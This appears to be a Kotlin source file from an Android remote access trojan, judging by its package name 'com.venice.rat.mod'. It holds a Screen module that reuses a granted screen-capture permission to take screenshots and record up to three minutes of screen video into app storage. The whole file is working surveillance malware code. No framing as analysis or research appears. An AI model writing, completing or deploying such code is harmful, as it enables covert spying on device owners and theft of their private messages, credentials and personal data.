package com.venice.rat.mod

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.util.DisplayMetrics
import com.venice.rat.core.U
import java.io.File

@SuppressLint("StaticFieldLeak")
object Screen {
    var data: Intent? = null
    var code: Int = 0
    private var proj: MediaProjection? = null

    fun ready() = data != null

    private fun ensure(ctx: Context): MediaProjection? {
        proj?.let { return it }
        val d = data ?: return null
        val m = ctx.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        val p = runCatching { m.getMediaProjection(code, d) }.getOrNull() ?: return null
        p.registerCallback(object : MediaProjection.Callback() {
            override fun onStop() { proj = null }
        }, Handler(ctx.mainLooper))
        proj = p
        return p
    }

    private fun metrics(ctx: Context): Triple<Int, Int, Int> {
        val dm = DisplayMetrics()
        runCatching {
            (ctx.getSystemService(Context.WINDOW_SERVICE) as android.view.WindowManager)
                .defaultDisplay.getRealMetrics(dm)
        }
        return Triple(dm.widthPixels.takeIf { it > 0 } ?: 1080,
            dm.heightPixels.takeIf { it > 0 } ?: 1920, ctx.resources.displayMetrics.densityDpi)
    }

    fun shot(ctx: Context): File? {
        val p = ensure(ctx) ?: return null
        val (w, h, dpi) = metrics(ctx)
        val ht = HandlerThread("ss").apply { start() }
        val h = Handler(ht.looper)
        val rd = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2)
        var vd: VirtualDisplay? = null
        val out = File(U.dir(ctx, "ss"), "s_${System.currentTimeMillis()}.png")
        return try {
            vd = p.createVirtualDisplay("ss", w, h, dpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, rd.surface, null, h)
            var tries = 0
            var img: android.media.Image? = null
            while (tries++ < 40 && img == null) {
                Thread.sleep(120)
                img = rd.acquireLatestImage()
            }
            if (img == null) return null
            val plane = img.planes[0]
            val rowPad = plane.rowStride - plane.pixelStride * w
            val bmp = Bitmap.createBitmap(w + rowPad / plane.pixelStride, h, Bitmap.Config.ARGB_8888)
            bmp.copyPixelsFromBuffer(plane.buffer)
            val crop = Bitmap.createBitmap(bmp, 0, 0, w, h)
            out.outputStream().use { crop.compress(Bitmap.CompressFormat.PNG, 90, it) }
            img.close()
            out
        } catch (e: Exception) {
            null
        } finally {
            runCatching { vd?.release() }
            runCatching { rd.close() }
            ht.quitSafely()
        }
    }

    fun record(ctx: Context, secs: Int): File? {
        val p = ensure(ctx) ?: return null
        val (w, h, dpi) = metrics(ctx)
        val out = File(U.dir(ctx, "sr"), "r_${System.currentTimeMillis()}.mp4")
        var vd: VirtualDisplay? = null
        var rec: MediaRecorder? = null
        return try {
            rec = if (Build.VERSION.SDK_INT >= 31) MediaRecorder(ctx) else @Suppress("DEPRECATION") MediaRecorder()
            rec.apply {
                setVideoSource(MediaRecorder.VideoSource.SURFACE)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                setVideoSize(w, h)
                setVideoFrameRate(24)
                setVideoEncodingBitRate(3_000_000)
                setOutputFile(out.absolutePath)
                prepare()
            }
            vd = p.createVirtualDisplay("sr", w, h, dpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, rec.surface, null, null)
            rec.start()
            Thread.sleep(secs.coerceIn(2, 180) * 1000L)
            runCatching { rec.stop() }
            if (out.exists() && out.length() > 1000) out else null
        } catch (e: Exception) {
            null
        } finally {
            runCatching { rec?.release() }
            runCatching { vd?.release() }
        }
    }
}
